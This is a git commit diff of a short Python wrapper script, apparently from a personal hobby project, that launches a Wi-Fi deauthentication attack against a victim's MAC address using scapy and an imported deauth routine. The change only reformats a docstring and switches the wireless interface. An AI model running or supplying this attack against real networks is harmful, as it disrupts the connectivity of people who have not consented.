38701883dd2d2f91468a4b8dd026e076ee86868e
root <root@Stolas.stolas>
2021-05-03 23:01:21 -0700

    First commit with basic stuff

--- tools/deauther_short.py
+++ tools/deauther_short.py
@@ -1,7 +1,7 @@
-    """Written by Aiden Yoshioka-Miller
-        
-        This is a very short script that minimizes the input that I need for my project to function. This is a bit unneeded, but it was kind of needed to get my deauth section working quicker.
-    """
+"""Written by Aiden Yoshioka-Miller
+
+This is a very short script that minimizes the input that I need for my project to function. This is a bit unneeded, but it was kind of needed to get my deauth section working quicker.
+"""
 from deauth import *
 from scapy.all import *
 
@@ -14,7 +14,7 @@ if __name__ == "__main__":
     parser = AP(description="Perform Deauthentication attack against a computer")
     parser.add_argument("-t", "--target-mac",metavar="MAC",help="the MAC address of the victim's computer (Airodump-ng Station)")
     args = parser.parse_args()
-    deauth("wlan1", 1000, args.target_mac, args.target_mac)
+    deauth("wlan0", 1000, args.target_mac, args.target_mac)
 
     myfile = "../.files/pid.txt"
     with open(myfile, "w") as f:
